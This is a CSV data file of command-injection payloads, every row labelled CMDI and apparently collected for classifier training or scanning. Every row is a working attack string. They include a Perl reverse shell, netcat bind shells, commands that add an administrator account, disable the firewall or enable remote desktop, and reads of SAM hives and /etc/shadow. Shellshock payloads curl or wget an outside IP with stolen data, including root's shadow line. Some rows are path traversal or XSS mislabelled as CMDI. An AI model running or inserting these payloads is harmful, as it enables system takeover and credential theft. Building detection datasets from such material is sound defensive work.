payload,attack
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
; id,CMDI
; id,CMDI
; id,CMDI
; id,CMDI
; ifconfig,CMDI
; ifconfig,CMDI
; ifconfig,CMDI
; ifconfig,CMDI
; ipconfig /all,CMDI
; ipconfig /all,CMDI
; ipconfig /all,CMDI
; ipconfig /all,CMDI
; ls -l /,CMDI
; ls -l /,CMDI
; ls -l /,CMDI
; ls -l /,CMDI
; ls -l /etc/,CMDI
; ls -l /etc/,CMDI
; ls -l /etc/,CMDI
; ls -l /etc/,CMDI
; ls -l /home/*,CMDI
; ls -l /home/*,CMDI
; ls -l /home/*,CMDI
; ls -l /home/*,CMDI
; ls -l /tmp,CMDI
; ls -l /tmp,CMDI
; ls -l /tmp,CMDI
; ls -l /tmp,CMDI
; ls -l /var/www/*,CMDI
; ls -l /var/www/*,CMDI
; ls -l /var/www/*,CMDI
; ls -l /var/www/*,CMDI
; ls -laR /etc,CMDI
; ls -laR /etc,CMDI
; ls -laR /etc,CMDI
; ls -laR /etc,CMDI
; ls -laR /var/www,CMDI
; ls -laR /var/www,CMDI
; ls -laR /var/www,CMDI
; ls -laR /var/www,CMDI
; nc -lvvp 4444 -e /bin/sh;,CMDI
; nc -lvvp 4444 -e /bin/sh;,CMDI
; nc -lvvp 4444 -e /bin/sh;,CMDI
; nc -lvvp 4444 -e /bin/sh;,CMDI
; net localgroup Administrators hacker /ADD,CMDI
; net localgroup Administrators hacker /ADD,CMDI
; net localgroup Administrators hacker /ADD,CMDI
; net localgroup Administrators hacker /ADD,CMDI
; net user hacker Password1 /ADD,CMDI
; net user hacker Password1 /ADD,CMDI
; net user hacker Password1 /ADD,CMDI
; net user hacker Password1 /ADD,CMDI
; net view,CMDI
; net view,CMDI
; net view,CMDI
; net view,CMDI
; netsh firewall set opmode disable,CMDI
; netsh firewall set opmode disable,CMDI
; netsh firewall set opmode disable,CMDI
; netsh firewall set opmode disable,CMDI
; netstat -an,CMDI
; netstat -an,CMDI
; netstat -an,CMDI
; netstat -an,CMDI
"; perl -e 'print ""X""x16096'",CMDI
"; perl -e 'print ""X""x16096'",CMDI
"; perl -e 'print ""X""x16096'",CMDI
"; perl -e 'print ""X""x16096'",CMDI
"; perl -e 'print ""X""x2048'",CMDI
"; perl -e 'print ""X""x2048'",CMDI
"; perl -e 'print ""X""x2048'",CMDI
"; perl -e 'print ""X""x2048'",CMDI
"; perl -e 'print ""X""x4096'",CMDI
"; perl -e 'print ""X""x4096'",CMDI
"; perl -e 'print ""X""x4096'",CMDI
"; perl -e 'print ""X""x4096'",CMDI
"; perl -e 'print ""X""x8096'",CMDI
"; perl -e 'print ""X""x8096'",CMDI
"; perl -e 'print ""X""x8096'",CMDI
"; perl -e 'print ""X""x8096'",CMDI
; pwd,CMDI
; pwd,CMDI
; pwd,CMDI
; pwd,CMDI
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
; sleep 1,CMDI
; sleep 1,CMDI
; sleep 1,CMDI
; sleep 1,CMDI
; sleep 10,CMDI
; sleep 10,CMDI
; sleep 10,CMDI
; sleep 10,CMDI
; sleep 15,CMDI
; sleep 15,CMDI
; sleep 15,CMDI
; sleep 15,CMDI
; sleep 5,CMDI
; sleep 5,CMDI
; sleep 5,CMDI
; sleep 5,CMDI
; sysinfo,CMDI
; sysinfo,CMDI
; sysinfo,CMDI
; sysinfo,CMDI
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
; system('sleep 5');,CMDI
; system('sleep 5');,CMDI
; system('sleep 5');,CMDI
; system('sleep 5');,CMDI
; systeminfo,CMDI
; systeminfo,CMDI
; systeminfo,CMDI
; systeminfo,CMDI
; type %SYSTEMROOT%\repair\SAM,CMDI
; type %SYSTEMROOT%\repair\SAM,CMDI
; type %SYSTEMROOT%\repair\SAM,CMDI
; type %SYSTEMROOT%\repair\SAM,CMDI
; type %SYSTEMROOT%\repair\SYSTEM,CMDI
; type %SYSTEMROOT%\repair\SYSTEM,CMDI
; type %SYSTEMROOT%\repair\SYSTEM,CMDI
; type %SYSTEMROOT%\repair\SYSTEM,CMDI
; type C:\Windows\repair\SAM,CMDI
; type C:\Windows\repair\SAM,CMDI
; type C:\Windows\repair\SAM,CMDI
; type C:\Windows\repair\SAM,CMDI
; type C:\Windows\repair\SYSTEM,CMDI
; type C:\Windows\repair\SYSTEM,CMDI
; type C:\Windows\repair\SYSTEM,CMDI
; type C:\Windows\repair\SYSTEM,CMDI
; type C:\WINNT\repair\SAM,CMDI
; type C:\WINNT\repair\SAM,CMDI
; type C:\WINNT\repair\SAM,CMDI
; type C:\WINNT\repair\SAM,CMDI
; uname -a,CMDI
; uname -a,CMDI
; uname -a,CMDI
; uname -a,CMDI
; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; whoami,CMDI
; whoami,CMDI
; whoami,CMDI
; whoami,CMDI
; whoami,CMDI
; whoami,CMDI
; whoami,CMDI
; whoami,CMDI
";{$_GET[""cmd""]}",CMDI
";{$_GET[""cmd""]}",CMDI
";{$_GET[""cmd""]}",CMDI
";{$_GET[""cmd""]}",CMDI
;{cmd},CMDI
;{cmd};,CMDI
;{cmd}/n,CMDI
;{cmd}|,CMDI
;/usr/bin/id\n,CMDI
;/usr/bin/id\n,CMDI
;/usr/bin/id\n,CMDI
;/usr/bin/id\n,CMDI
;/usr/bin/id|,CMDI
;/usr/bin/id|,CMDI
;/usr/bin/id|,CMDI
;/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;|/usr/bin/id|,CMDI
;${@print(md5(RCEVulnerable))};,CMDI
;${@print(md5(RCEVulnerable))};,CMDI
;${@print(md5(RCEVulnerable))};,CMDI
;${@print(md5(RCEVulnerable))};,CMDI
;CMD=$'{cmd}';$CMD,CMDI
";CMD=$""{cmd}"";$CMD",CMDI
;CMD=$\'{cmd}\';$CMD,CMDI
;echo '<script>alert(1)</script>',CMDI
;echo '<script>alert(1)</script>',CMDI
;echo '<script>alert(1)</script>',CMDI
;echo '<script>alert(1)</script>',CMDI
;echo%20'<script>alert(1)</script>',CMDI
;echo%20'<script>alert(1)</script>',CMDI
;echo%20'<script>alert(1)</script>',CMDI
;echo%20'<script>alert(1)</script>',CMDI
;echo%20KHMFRS$((69%2B67))$(echo%20KHMFRS)KHMFRS',CMDI
;echo%20MPCSBG$((54%2B42))$(echo%20MPCSBG)MPCSBG,CMDI
";echo%20YRBNTY$((83%2B14))$(echo%20YRBNTY)YRBNTY""",CMDI
;id,CMDI
;id,CMDI
;id,CMDI
;id,CMDI
;id,CMDI
;id,CMDI
;id,CMDI
;id,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;,CMDI
;id;',CMDI
;id\n,CMDI
;id\n,CMDI
;id\n,CMDI
;id\n,CMDI
;id\n,CMDI
;id\n,CMDI
;id\n,CMDI
;id\n,CMDI
;id|,CMDI
;id|,CMDI
;id|,CMDI
;id|,CMDI
;id|,CMDI
;id|,CMDI
;id|,CMDI
;id|,CMDI
;ls+-al;',CMDI
;netstat -a;,CMDI
;netstat -a;,CMDI
;netstat -a;,CMDI
;netstat -a;,CMDI
;netstat -a;,CMDI
;netstat -a;,CMDI
;netstat -a;,CMDI
;netstat -a;,CMDI
;phpinfo(),CMDI
;phpinfo(),CMDI
;phpinfo(),CMDI
;phpinfo(),CMDI
;phpinfo();//,CMDI
;phpinfo();//,CMDI
;phpinfo();//,CMDI
;phpinfo();//,CMDI
;phpinfo();//,CMDI
;phpinfo();//,CMDI
;phpinfo();//,CMDI
;phpinfo();//,CMDI
;system('{cmd}'),CMDI
;system('/usr/bin/id'),CMDI
;system('/usr/bin/id'),CMDI
;system('/usr/bin/id'),CMDI
;system('/usr/bin/id'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('cat%20/etc/passwd'),CMDI
;system('id'),CMDI
;system('id'),CMDI
;system('id'),CMDI
;system('id'),CMDI
;uname;,CMDI
;uname;,CMDI
;uname;,CMDI
;uname;,CMDI
:phpversion();,CMDI
:phpversion();,CMDI
:phpversion();,CMDI
:phpversion();,CMDI
.........................../../../../file',CMDI
...........................\\..\\..\\..\\file',CMDI
../../../../../../../../../../../../boot.ini,CMDI
../../../../../../../../../../../../boot.ini%00,CMDI
../../../../../../../../../../../../etc/hosts,CMDI
../../../../../../../../../../../../etc/hosts%00,CMDI
../../../../../../../../../../../../etc/passwd,CMDI
../../../../../../../../../../../../etc/passwd%00,CMDI
../../../../../../../../../../../../etc/shadow,CMDI
../../../../../../../../../../../../etc/shadow%00,CMDI
../../../../../../../../../../../../localstart.asp,CMDI
../../../../../../../../../../../../localstart.asp%00,CMDI
../../../../../../../../conf/server.xml,CMDI
../../../../../file//////////////',CMDI
../../../../../filename/////[...]/////',CMDI
../../../../etc/aaa/../aaa/bbb/../../hosts',CMDI
../../../../etc/aaa/../hosts',CMDI
../../../../etc/hosts/.',CMDI
../../../file',CMDI
../../../file%00',CMDI
../../boot.ini,CMDI
../../etc/././././hosts',CMDI
..////////////..////////////////..///////////////../etc//////////hosts',CMDI
../etc/./hosts',CMDI
..\..\..\..\..\..\..\..\..\..\boot.ini,CMDI
..\..\..\..\..\..\..\..\..\..\boot.ini%00,CMDI
..\..\..\..\..\..\..\..\..\..\etc\passwd,CMDI
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,CMDI
..\..\..\..\..\..\..\..\..\..\etc\shadow,CMDI
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,CMDI
..%25c1%259c..%25c1%259cfile',CMDI
..%2F..%2F..%2Fbin/ls%20-al|',CMDI
..%2f..%2f..%2ffile',CMDI
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,CMDI
..%c0%af..%c0%af../bin/ls%20-al|',CMDI
..%c0%af..%c0%af..%c0%affile',CMDI
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,CMDI
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,CMDI
"""",CMDI
"""",CMDI
""" & whoami",CMDI
""" & whoami",CMDI
""" & whoami",CMDI
""" & whoami",CMDI
""" && whoami",CMDI
""" && whoami",CMDI
""" && whoami",CMDI
""" && whoami",CMDI
""" | whoami",CMDI
""" | whoami",CMDI
""" | whoami",CMDI
""" | whoami",CMDI
""" || whoami",CMDI
""" || whoami",CMDI
""" || whoami",CMDI
""" || whoami",CMDI
""" whoami",CMDI
""" whoami",CMDI
""" whoami",CMDI
""" whoami",CMDI
"""; whoami",CMDI
"""; whoami",CMDI
"""; whoami",CMDI
"""; whoami",CMDI
""";id;""",CMDI
"""'",CMDI
"""'",CMDI
"""'",CMDI
"""\n/bin/ls -al\n""",CMDI
"""& ping -i 30 127.0.0.1 &""",CMDI
"""|/usr/bin/id|""",CMDI
"""||/usr/bin/id|""",CMDI
"""|id|""",CMDI
() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; },CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
